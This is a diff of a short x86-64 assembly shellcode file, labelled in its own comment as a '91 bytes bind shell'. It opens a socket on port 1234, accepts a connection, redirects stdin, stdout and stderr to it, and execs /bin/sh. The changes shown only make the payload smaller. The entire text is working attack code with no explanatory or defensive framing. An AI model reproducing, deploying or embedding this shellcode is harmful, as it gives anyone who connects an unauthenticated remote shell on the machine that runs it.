@@ -27,11 +27,12 @@
 ;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;    
-
+; 91 bytes bind shell
+;
     bits 64
     
-    mov     rax, ~0x00000000d2040200
-    not     rax
+    mov     eax, ~0xd2040200 & 0xFFFFFFFF
+    not     eax
     push    rax
     
     xor     ebp, ebp
@@ -48,7 +49,8 @@
     mov     al, 97           ; eax = sys_socket
     syscall
     
-    xchg    eax, edi         ; edi=sockfd
+    xchg    eax, edi         ; edi=s
+		xchg    eax, ebx         ; ebx=2
     
     ; step 2, bind to port 1234 
     ; bind(s, {AF_INET,1234,INADDR_ANY}, 16)
@@ -78,7 +80,7 @@
     syscall
     
     xchg    eax, edi         ; edi=r
-    push    2
+    push    rbx              ; rsi=2
     pop     rsi
     
     ; step 5, assign socket handle to stdin,stdout,stderr
@@ -95,7 +97,7 @@ dup_loop64:
     
     ; step 6, execute /bin/sh
     ; execve("/bin//sh", {"/bin//sh", NULL}, 0);
-    inc     esi
+		xor     esi, esi 
     cdq                      ; rdx=0
     mov     rbx, '/bin//sh'
     push    rdx              ; 0
